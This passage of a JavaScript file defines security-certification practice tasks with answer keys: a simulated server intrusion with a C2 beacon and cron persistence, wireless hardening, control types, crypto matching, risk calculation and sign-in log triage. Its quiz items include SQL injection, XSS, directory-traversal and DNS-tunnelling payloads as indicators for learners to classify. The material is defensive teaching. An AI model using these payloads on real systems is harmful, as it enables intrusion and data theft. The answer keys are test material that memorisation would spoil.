      '/home/deploy/k.sh': '-rwxr-xr-x deploy deploy', '/usr/local/bin/backup.sh': '-rwxr-xr-x root root'
    },
    hashes: {
      '/tmp/.x/kworker': '9c4e1f0b7d2a5e8c3b6f9a1d4e7c0b3a6f9d2c5e8b1a4d7f0c3e6b9a2d5f8c1e',
      '/home/deploy/k.sh': '2b7a91c03d4e5f60718293a4b5c6d7e8f9011223344556677889900aabbccdd0',
      '/usr/local/bin/backup.sh': '5d41402abc4b2a76b9719d911017c592ae0f61e2c4a1b7c3d9e8f7a6b5c4d3e2',
      '/var/www/html/index.php': 'a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a392'
    },
    canned: {
      'ps aux': 'USER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       612  0.0  0.3 /usr/sbin/sshd -D\nwww-data   830  0.2  1.4 /usr/sbin/apache2 -k start\nwww-data   831  0.1  1.3 /usr/sbin/apache2 -k start\nroot      2403 97.8  6.2 /tmp/.x/kworker -c 45.33.32.156:4444\nanalyst   3120  0.0  0.1 -bash',
      'netstat -antp': 'Proto Local Address        Foreign Address        State        PID/Program\ntcp   0.0.0.0:22           0.0.0.0:*              LISTEN       612/sshd\ntcp   0.0.0.0:443          0.0.0.0:*              LISTEN       830/apache2\ntcp   10.0.1.10:22         10.0.3.5:50410         ESTABLISHED  3001/sshd\ntcp   10.0.1.10:51515      45.33.32.156:4444      ESTABLISHED  2403/kworker',
      'last': 'admin    pts/0   10.0.3.5        Thu Mar 12 10:01   still logged in\ndeploy   pts/1   45.33.32.156    Thu Mar 12 09:15 - 09:19  (00:03)\nadmin    pts/0   10.0.3.5        Thu Mar 12 08:58 - 09:40  (00:42)'
    },
    questions: [
      { id: 'ip', kind: 'text', label: 'Attacker IP address', placeholder: 'e.g. 203.0.113.5', accept: ['45.33.32.156'], why: 'It produced the failed attempts, then “Accepted password for deploy”, and it is the C2 destination.' },
      { id: 'acct', kind: 'text', label: 'Compromised account name', accept: ['deploy'], why: 'auth.log shows “Accepted password for deploy from 45.33.32.156”, and <code>last</code> confirms it.' },
      { id: 'fails', kind: 'number', label: 'Failed password attempts from the attacker IP before the successful login', accept: [20], tol: 0, why: '6 attempts for invalid user “oracle” plus 14 for “deploy” = 20. Try: <code>grep "45.33.32.156" /var/log/auth.log | grep -c Failed</code>.' },
      { id: 'port', kind: 'text', label: 'Remote port used for command-and-control', accept: ['4444'], why: 'ps and netstat show kworker connected to 45.33.32.156:4444.' },
      { id: 'persist', kind: 'select', label: 'Persistence mechanism', options: ['/etc/crontab entry running every 5 minutes', 'Modified /etc/passwd entry', 'Web shell in /var/www/html/index.php', 'SSH authorized_keys for root'], accept: ['/etc/crontab entry running every 5 minutes'], why: 'The attacker edited /etc/crontab (see sudo in auth.log) to relaunch /tmp/.x/kworker every 5 minutes.' },
      { id: 'hash', kind: 'select', label: 'Which file matches the threat intelligence hash?', options: ['/tmp/.x/kworker', '/home/deploy/k.sh', '/usr/local/bin/backup.sh', '/var/www/html/index.php'], accept: ['/tmp/.x/kworker'], why: '<code>sha256sum /tmp/.x/kworker</code> matches the IoC. k.sh is the dropper that downloaded it.' },
      { id: 'next', kind: 'select', label: 'BEST next step', options: ['Isolate web01 from the network and preserve memory and disk evidence', 'Delete /tmp/.x and reboot the server', 'Change the deploy password and continue normal operation', 'Post the incident details on social media'], accept: ['Isolate web01 from the network and preserve memory and disk evidence'], why: 'Contain while preserving evidence. Deleting files and rebooting destroys volatile evidence, and changing one password leaves the backdoor running.' }
    ],
    solution: {
      steps: [
        '<code>cat README.txt</code> lists where the evidence is.',
        '<code>grep Accepted /var/log/auth.log</code> shows “Accepted password for <strong>deploy</strong> from <strong>45.33.32.156</strong>”, unlike the admin’s publickey logins from 10.0.3.5.',
        '<code>grep "45.33.32.156" /var/log/auth.log | grep -c Failed</code> returns <strong>20</strong> (6 for invalid user oracle, 14 for deploy). This is a brute-force attack that worked.',
        '<code>ps aux</code> and <code>netstat -antp</code> show <code>/tmp/.x/kworker</code> using about 98% CPU and connected to <strong>45.33.32.156:4444</strong>.',
        '<code>cat /etc/crontab</code> shows a root entry every 5 minutes that relaunches kworker (<strong>persistence</strong>). auth.log shows deploy used sudo to edit it.',
        '<code>cat /home/deploy/.bash_history</code> shows the attacker downloaded k.sh and tried to clear their history.',
        '<code>sha256sum /tmp/.x/kworker</code> matches the IoC.',
        'Next step: <strong>isolate web01 and preserve evidence</strong> (memory first). Then eradicate (remove the cron entry and binary, rebuild), rotate credentials, disable SSH password authentication and block the IP.'
      ]
    }
  });

  /* ---------- 9. Secure wireless configuration ---------- */
  P.push({
    id: 'wifi-config', type: 'config', title: 'Secure the wireless network', objs: ['4.1', '3.2'], d: 2, minutes: 8,
    scenario: '<p>You are configuring a new wireless controller. The company has Active Directory, a RADIUS server (10.0.2.15) and an internal PKI that issues device certificates through MDM. Visitors need internet-only guest access. A recent assessment found the old network leaking signal into the parking lot.</p>',
    tasks: ['Configure the corporate SSID for individual, certificate-capable authentication.', 'Isolate guests from corporate resources and from each other.', 'Harden the access point management plane.'],
    initial: { cmode: 'WPA2-Personal (PSK)', cauth: 'Local pre-shared key', ceap: 'None', pmf: 'Disabled', gmode: 'Open (no encryption)', gvlan: 'VLAN 10 – Corporate', giso: false, wps: true, mgmt: 'HTTP', pwd: 'Keep default (admin / admin)', fw: false, bcast: true, power: 'Maximum (100%)' },
    groups: [
      { label: 'Corporate SSID: CORP', fields: [
        { id: 'cmode', kind: 'select', label: 'Security mode', options: ['Open (no encryption)', 'WEP', 'WPA2-Personal (PSK)', 'WPA3-Personal (SAE)', 'WPA3-Enterprise'], accept: ['WPA3-Enterprise'], why: 'Enterprise mode authenticates each user or device through 802.1X, so access can be revoked individually.' },
        { id: 'cauth', kind: 'select', label: 'Authentication server', options: ['Local pre-shared key', 'RADIUS server 10.0.2.15', 'None'], accept: ['RADIUS server 10.0.2.15'], why: 'WPA3-Enterprise uses a RADIUS server for 802.1X authentication.' },
        { id: 'ceap', kind: 'select', label: 'EAP method', options: ['None', 'EAP-MD5', 'PEAP-MSCHAPv2', 'EAP-TLS (device certificates)'], accept: ['EAP-TLS (device certificates)', 'PEAP-MSCHAPv2'], why: 'EAP-TLS is strongest because it uses mutual certificates, and the company already has a PKI. PEAP-MSCHAPv2 is acceptable but relies on passwords. EAP-MD5 is insecure.' },
        { id: 'pmf', kind: 'select', label: 'Protected Management Frames (802.11w)', options: ['Disabled', 'Optional', 'Required'], accept: ['Required'], why: 'WPA3 requires PMF, which protects against deauthentication and disassociation attacks.' }
      ] },
      { label: 'Guest SSID: VISITOR', fields: [
        { id: 'gmode', kind: 'select', label: 'Security mode', options: ['Open (no encryption)', 'Enhanced Open (OWE)', 'WPA2-Personal (PSK)', 'WPA3-Personal (SAE)'], accept: ['Enhanced Open (OWE)', 'WPA3-Personal (SAE)'], why: 'OWE encrypts open guest traffic without a password. WPA3-Personal with a rotating guest passphrase is also acceptable. Plain open Wi-Fi sends traffic unencrypted.' },
        { id: 'gvlan', kind: 'select', label: 'Guest VLAN', options: ['VLAN 10 – Corporate', 'VLAN 20 – Servers', 'VLAN 50 – Guest (internet only)'], accept: ['VLAN 50 – Guest (internet only)'], why: 'Segmentation keeps guests off corporate and server networks.' },
        { id: 'giso', kind: 'checkbox', label: 'Client isolation (guests can’t reach each other)', accept: [true], why: 'Stops guest devices from attacking one another.' }
      ] },
      { label: 'Access point management and radio', fields: [
        { id: 'wps', kind: 'checkbox', label: 'Enable Wi-Fi Protected Setup (WPS)', accept: [false], why: 'The WPS PIN can be brute-forced. Disable it.' },
        { id: 'mgmt', kind: 'select', label: 'Management interface protocol', options: ['HTTP', 'Telnet', 'HTTPS', 'SSH and HTTPS'], accept: ['HTTPS', 'SSH and HTTPS'], why: 'Management traffic must be encrypted. HTTP and Telnet send credentials in clear text.' },
        { id: 'pwd', kind: 'select', label: 'Administrator credential', options: ['Keep default (admin / admin)', 'Unique strong password stored in the password vault'], accept: ['Unique strong password stored in the password vault'], why: 'Default credentials are among the first things attackers try.' },
        { id: 'fw', kind: 'checkbox', label: 'Automatic firmware updates (in the maintenance window)', accept: [true], why: 'Keeps the controller patched against known vulnerabilities.' },
        { id: 'bcast', kind: 'checkbox', label: 'Broadcast SSID', accept: [true, false], why: 'Either setting is fine. Hiding the SSID isn’t real security, because the name still appears in probe traffic.' },
        { id: 'power', kind: 'select', label: 'Transmit power', options: ['Maximum (100%)', 'Tuned per site survey heat map'], accept: ['Tuned per site survey heat map'], why: 'Tuning power using the site survey limits leakage into the parking lot.' }
      ] }
    ],
    solution: {
      steps: [
        'CORP: <strong>WPA3-Enterprise</strong> + <strong>RADIUS 10.0.2.15</strong> + <strong>EAP-TLS</strong> (device certificates from the existing PKI; PEAP is acceptable) + <strong>PMF required</strong>.',
        'VISITOR: <strong>Enhanced Open (OWE)</strong> or WPA3-Personal, on <strong>VLAN 50 (internet only)</strong>, with <strong>client isolation</strong>.',
        'Management: disable <strong>WPS</strong>, use <strong>HTTPS/SSH</strong>, set a <strong>unique vaulted admin password</strong>, enable <strong>firmware updates</strong>.',
        'Radio: tune <strong>transmit power</strong> using the site survey heat map so the signal doesn’t reach the parking lot. SSID broadcast is a free choice.'
      ],
      alt: 'EAP method: EAP-TLS or PEAP-MSCHAPv2. Guest security: OWE or WPA3-Personal. Management: HTTPS or SSH + HTTPS. SSID broadcast: either setting.'
    }
  });

  /* ---------- 10. Control types drag-and-drop ---------- */
  P.push({
    id: 'control-types', type: 'placement', layout: 'grid', title: 'Classify security controls by type', objs: ['1.1'], d: 1, minutes: 6,
    scenario: '<p>Drag each control to the control type it <strong>primarily</strong> represents in the situation described.</p>',
    zones: [
      { id: 'prev', label: 'Preventive', desc: 'stops it from happening' }, { id: 'det', label: 'Deterrent', desc: 'discourages attempts' },
      { id: 'detv', label: 'Detective', desc: 'identifies / records' }, { id: 'corr', label: 'Corrective', desc: 'restores after an incident' },
      { id: 'comp', label: 'Compensating', desc: 'alternative when the primary isn’t possible' }, { id: 'dir', label: 'Directive', desc: 'instructs behavior' }
    ],
    tokens: [
      { id: 't1', label: 'Firewall rule blocking inbound RDP', accept: ['prev'], why: 'Blocks the connection outright.' },
      { id: 't2', label: '“Authorized personnel only, violators prosecuted” sign', accept: ['det'], why: 'Discourages, but can’t stop anyone.' },
      { id: 't3', label: 'IDS alert on a port scan', accept: ['detv'], why: 'Identifies activity without blocking it.' },
      { id: 't4', label: 'Restoring a corrupted database from backup', accept: ['corr'], why: 'Restores normal operation after the incident.' },
      { id: 't5', label: 'Weekly log review because a 2-person team can’t separate duties', accept: ['comp'], why: 'Substitutes for separation of duties that isn’t feasible.' },
      { id: 't6', label: 'Acceptable use policy', accept: ['dir'], why: 'Tells users what they may and may not do.' },
      { id: 't7', label: 'Reviewing CCTV footage after a theft', accept: ['detv'], why: 'Used to identify what happened.' },
      { id: 't8', label: 'Reimaging a malware-infected laptop', accept: ['corr'], why: 'Corrects the damage.' },
      { id: 't9', label: 'Access control vestibule at the data center', accept: ['prev'], why: 'Physically prevents tailgating.' },
      { id: 't10', label: 'Isolating an unpatchable legacy server on its own VLAN', accept: ['comp'], why: 'Alternative control because patching isn’t possible.' },
      { id: 't11', label: 'Visible (dummy) camera at the loading dock', accept: ['det'], why: 'A dummy camera records nothing, so it only deters.' },
      { id: 't12', label: 'Procedure requiring visitors to sign in and be escorted', accept: ['dir', 'prev'], why: 'It directs behavior. Enforced escort can also be considered preventive, so both answers are accepted.' }
    ],
    solution: { steps: ['Ask “what does it do?”: block (preventive), discourage (deterrent), identify (detective), fix after (corrective), substitute (compensating) or instruct (directive).', 'Cameras depend on context: a dummy camera only deters, while reviewing footage is detective.', 'Isolation of unpatchable systems and extra reviews in small teams are classic compensating controls.'] }
  });

  /* ---------- 11. Match indicators to attacks ---------- */
  P.push({
    id: 'attack-match', type: 'placement', layout: 'grid', title: 'Match indicators to attack types', objs: ['2.4'], d: 2, minutes: 7,
    scenario: '<p>Your SIEM surfaced the following indicators. Drag each indicator to the attack it most likely represents. One indicator is normal activity. Leave it in the pool.</p>',
    zones: [
      { id: 'sqli', label: 'SQL injection' }, { id: 'xss', label: 'Cross-site scripting' }, { id: 'spray', label: 'Password spraying' }, { id: 'brute', label: 'Brute force' },
      { id: 'dns', label: 'DNS tunneling' }, { id: 'onpath', label: 'On-path (ARP poisoning)' }, { id: 'trav', label: 'Directory traversal' }, { id: 'replay', label: 'Replay attack' }
    ],
    tokens: [
      { id: 'i1', label: '`\' OR 1=1--` submitted in a login form', accept: ['sqli'], why: 'Classic SQL logic manipulation.' },
      { id: 'i2', label: '`<img src=x onerror=alert(1)>` posted in a product review', accept: ['xss'], why: 'An event-handler script injection (stored XSS).' },
      { id: 'i3', label: 'One failed login each for 600 accounts using “Spring2026!”', accept: ['spray'], why: 'One password across many accounts.' },
      { id: 'i4', label: '900 failed logins for “admin” in 5 minutes, then lockout', accept: ['brute'], why: 'Many passwords against one account.' },
      { id: 'i5', label: 'Thousands of queries like 4a6f686e2e.x7.exfil.example', accept: ['dns'], why: 'Data encoded in long random subdomains.' },
      { id: 'i6', label: 'Gateway IP mapped to two different MAC addresses', accept: ['onpath'], why: 'ARP poisoning redirects traffic through the attacker.' },
      { id: 'i7', label: '`GET /files?name=..%2f..%2fetc%2fpasswd`', accept: ['trav'], why: 'URL-encoded ../ sequences.' },
      { id: 'i8', label: 'Identical signed payment request resubmitted 10 minutes later from a new IP', accept: ['replay'], why: 'Captured valid data re-sent.' },
      { id: 'i9', label: 'Successful login from the user’s usual laptop during work hours', accept: [], why: 'Normal activity.' }
    ],
    solution: { steps: ['Injection payloads: quotes or OR 1=1 = SQLi; script or event handlers = XSS; ../ = traversal.', 'Password attacks: many accounts with one password = spraying; one account with many passwords = brute force.', 'Network: long encoded subdomains = DNS tunneling; duplicate gateway MAC = ARP poisoning (on-path).', 'Reused valid messages = replay (defend with nonces and timestamps).'] }
  });

  /* ---------- 12. Match cryptographic solutions ---------- */
  P.push({
    id: 'crypto-match', type: 'placement', layout: 'grid', title: 'Choose the right cryptographic solution', objs: ['1.4', '3.3'], d: 2, minutes: 6,
    scenario: '<p>Match each business requirement to the cryptographic solution that best meets it. One item provides no security at all. Leave it in the pool.</p>',
    zones: [
      { id: 'hash', label: 'Hashing (SHA-256)' }, { id: 'sig', label: 'Digital signature' }, { id: 'sym', label: 'Symmetric encryption (AES)' }, { id: 'kex', label: 'Key exchange (ECDHE)' },
      { id: 'tok', label: 'Tokenization' }, { id: 'kst', label: 'Key stretching (bcrypt / PBKDF2)' }, { id: 'hsm', label: 'HSM' }
    ],
    tokens: [
      { id: 'c1', label: 'Verify a downloaded ISO image wasn’t altered', accept: ['hash'], why: 'Compare the published hash with the hash of the file you downloaded.' },
      { id: 'c2', label: 'Prove an approval email came from the CFO and wasn’t modified', accept: ['sig'], why: 'A signature gives integrity, authentication and non-repudiation.' },
      { id: 'c3', label: 'Encrypt a 2 TB backup quickly', accept: ['sym'], why: 'Symmetric ciphers are fast for bulk data.' },
      { id: 'c4', label: 'Agree on a session key over an untrusted network', accept: ['kex'], why: 'Diffie-Hellman/ECDHE derive a shared secret, with forward secrecy.' },
      { id: 'c5', label: 'Remove card numbers from the order DB but still allow future charges', accept: ['tok'], why: 'Tokens map back to the card only through the secure vault.' },
      { id: 'c6', label: 'Store passwords so stolen hashes are slow to crack', accept: ['kst'], why: 'Salted, iterated hashing slows down attackers.' },
      { id: 'c7', label: 'Protect the root CA private key in tamper-resistant hardware', accept: ['hsm'], why: 'HSMs protect high-value keys and perform signing inside the device.' },
      { id: 'c8', label: 'Base64-encode customer SSNs', accept: [], why: 'Encoding is reversible by anyone and isn’t security.' }
    ],
    solution: { steps: ['Integrity only → hash. Integrity plus proof of origin → signature (sender’s private key).', 'Bulk confidentiality → AES. Establishing keys → ECDHE/DH.', 'Payment data → tokenization. Passwords → salted key stretching. High-value keys → HSM.', 'Encoding (Base64) provides no confidentiality.'] }
  });

  /* ---------- 13. Quantitative risk analysis ---------- */
  P.push({
    id: 'risk-calc', type: 'config', title: 'Quantitative risk analysis', objs: ['5.2'], d: 2, minutes: 8,
    scenario: '<p>The customer database for an online store is valued at <strong>$800,000</strong> (including breach response costs). A successful SQL injection breach would cause a loss of <strong>40%</strong> of that value. Based on industry data, such a breach is expected <strong>once every 4 years</strong>.</p><p>A managed WAF plus database activity monitoring costs <strong>$50,000 per year</strong> and would reduce the expected frequency to <strong>once every 20 years</strong>.</p>',
    tasks: ['Calculate SLE, ARO and ALE before the control.', 'Calculate the ALE after the control and the control’s net annual value.', 'Choose the risk responses.'],
    groups: [
      { label: 'Before the control', desc: 'Enter numbers only. $ signs and commas are allowed.', fields: [
        { id: 'sle', kind: 'number', label: 'Single loss expectancy (SLE) in $', accept: [320000], tol: 1, why: 'SLE = AV × EF = $800,000 × 0.40 = $320,000.' },
        { id: 'aro', kind: 'number', label: 'Annualized rate of occurrence (ARO)', accept: [0.25], tol: 0.001, why: 'Once every 4 years = 1 ÷ 4 = 0.25.' },
        { id: 'ale', kind: 'number', label: 'Annualized loss expectancy (ALE) in $', accept: [80000], tol: 1, why: 'ALE = SLE × ARO = $320,000 × 0.25 = $80,000.' }
      ] },
      { label: 'After the control', fields: [
        { id: 'ale2', kind: 'number', label: 'New ALE with the control in $', accept: [16000], tol: 1, why: 'New ARO = 1 ÷ 20 = 0.05, so ALE = $320,000 × 0.05 = $16,000.' },
        { id: 'value', kind: 'number', label: 'Net annual value of the control in $ (ALE before − ALE after − annual cost)', accept: [14000], tol: 1, why: '$80,000 − $16,000 − $50,000 = $14,000 per year, so the control is cost-justified.' }
      ] },
      { label: 'Risk responses', fields: [
        { id: 'decision', kind: 'select', label: 'Implementing the WAF and monitoring is which strategy?', options: ['Mitigate', 'Accept', 'Avoid', 'Transfer'], accept: ['Mitigate'], why: 'Controls that reduce likelihood or impact are mitigation.' },
        { id: 'ins', kind: 'select', label: 'Also buying cyber insurance for the remaining risk is which strategy?', options: ['Mitigate', 'Accept', 'Avoid', 'Transfer'], accept: ['Transfer'], why: 'Insurance transfers the financial impact to a third party.' },
        { id: 'shut', kind: 'select', label: 'Shutting down online sales to eliminate the risk would be which strategy?', options: ['Mitigate', 'Accept', 'Avoid', 'Transfer'], accept: ['Avoid'], why: 'Stopping the risky activity is avoidance.' }
      ] }
    ],
    solution: { steps: ['SLE = $800,000 × 0.40 = <strong>$320,000</strong>.', 'ARO = 1/4 = <strong>0.25</strong>; ALE = $320,000 × 0.25 = <strong>$80,000</strong>.', 'With the control, ARO = 1/20 = 0.05 and ALE = <strong>$16,000</strong>.', 'Net value = $80,000 − $16,000 − $50,000 = <strong>$14,000/year</strong>, so the control is worth it.', 'Control = <strong>mitigate</strong>; insurance = <strong>transfer</strong>; shutting down = <strong>avoid</strong>.'] }
  });

  /* ---------- 14. Authentication log analysis ---------- */
  P.push({
    id: 'auth-logs', type: 'logs', title: 'Investigate suspicious sign-ins', objs: ['4.9', '2.4', '4.6'], d: 3, minutes: 9,
    scenario: '<p>The identity provider’s sign-in log was exported after a user reported odd emails being sent from their mailbox. The office’s public IP is <code>203.0.113.10</code>. Flag every entry that is evidence of the attack, then answer the questions.</p>',
    source: 'IdP sign-in log (UTC)',
    lines: [
      { id: 'a1', bad: false, text: '07:58:12 SUCCESS user=maria.gomez src=203.0.113.10 app=Mail mfa=passed device=managed', why: 'Normal office sign-in with MFA.' },
      { id: 'a2', bad: true, text: '08:01:03 FAIL    user=amy.lee     src=185.220.101.4 app=Mail reason=bad_password client=legacy-IMAP', why: 'Part of a spray from one external IP over a legacy protocol.' },
      { id: 'a3', bad: true, text: '08:01:09 FAIL    user=ben.ortiz   src=185.220.101.4 app=Mail reason=bad_password client=legacy-IMAP', why: 'Same source, different user, same timing: spraying.' },
      { id: 'a4', bad: false, text: '08:01:15 FAIL    user=chen.wu     src=203.0.113.10 app=Portal reason=bad_password device=managed', why: 'One typo from the office. Followed by a normal success.' },
      { id: 'a5', bad: true, text: '08:01:16 FAIL    user=dana.kim    src=185.220.101.4 app=Mail reason=bad_password client=legacy-IMAP', why: 'Spray continues.' },
      { id: 'a7', bad: true, text: '08:01:22 FAIL    user=eric.berg   src=185.220.101.4 app=Mail reason=bad_password client=legacy-IMAP', why: 'Spray continues.' },
      { id: 'a8', bad: true, text: '08:01:29 SUCCESS user=raj.patel   src=185.220.101.4 app=Mail mfa=not_required client=legacy-IMAP', why: 'The spray worked. Legacy IMAP bypassed MFA.' },
      { id: 'a6', bad: false, text: '08:01:31 SUCCESS user=chen.wu     src=203.0.113.10 app=Portal mfa=passed device=managed', why: 'Legitimate retry with MFA.' },
      { id: 'a9', bad: true, text: '08:01:35 FAIL    user=sara.nye    src=185.220.101.4 app=Mail reason=bad_password client=legacy-IMAP', why: 'Spray continues after the success.' },
      { id: 'a10', bad: true, text: '08:06:50 AUDIT   user=raj.patel   src=185.220.101.4 action=New-InboxRule name="." forward_to=billing-update@protonmail.example', why: 'Malicious mailbox forwarding rule. A common BEC persistence trick.' },
      { id: 'a11', bad: false, text: '09:12:40 SUCCESS user=raj.patel   src=203.0.113.10 app=Portal mfa=passed device=managed', why: 'The real Raj, signing in from the office with MFA.' }
    ],
    questions: [
      { id: 'type', kind: 'select', label: 'What attack technique was used?', options: ['Password spraying', 'Brute force against one account', 'Pass-the-hash', 'SQL injection'], accept: ['Password spraying'], why: 'One source tried a password against many different accounts, a few seconds apart.' },
      { id: 'acct', kind: 'select', label: 'Which account was compromised?', options: ['amy.lee', 'chen.wu', 'raj.patel', 'maria.gomez'], accept: ['raj.patel'], why: 'SUCCESS from the attacking IP, followed by an inbox forwarding rule.' },
      { id: 'resp', kind: 'select', label: 'What is the BEST immediate response?', options: ['Reset raj.patel’s password, revoke active sessions, and remove the forwarding rule', 'Lock every account in the company for 24 hours', 'Block the office IP 203.0.113.10', 'Take no action, because the sign-in succeeded normally'], accept: ['Reset raj.patel’s password, revoke active sessions, and remove the forwarding rule'], why: 'Contain the compromised identity and remove the persistence the attacker set up. Also block 185.220.101.4.' },
      { id: 'prev', kind: 'multi', label: 'Which TWO controls would BEST prevent a repeat?', options: ['Block legacy authentication protocols such as IMAP basic auth', 'Enforce MFA / conditional access for all sign-ins', 'Lengthen password expiration to 180 days', 'Disable sign-in logging to reduce noise'], accept: ['Block legacy authentication protocols such as IMAP basic auth', 'Enforce MFA / conditional access for all sign-ins'], why: 'Legacy protocols bypassed MFA. Blocking them and enforcing MFA stops credential-only logins.' }
    ],
    solution: {
      steps: [
        'Group entries by source IP. 185.220.101.4 tries a different user every ~6 seconds over legacy IMAP: <strong>password spraying</strong>. Flag all of its entries.',
        'Find the success from that IP: <strong>raj.patel</strong> with <code>mfa=not_required</code>, because legacy IMAP bypassed MFA.',
        'Flag the follow-up <strong>inbox forwarding rule</strong>, which the attacker uses for persistence and data theft.',
        'Don’t flag office activity (203.0.113.10). chen.wu’s single typo followed by success is normal, and so is the real Raj’s later MFA sign-in.',
        'Respond: reset the password, revoke sessions, delete the rule, block the IP, then disable legacy auth and enforce MFA everywhere.'
      ]
    }
  });
})();
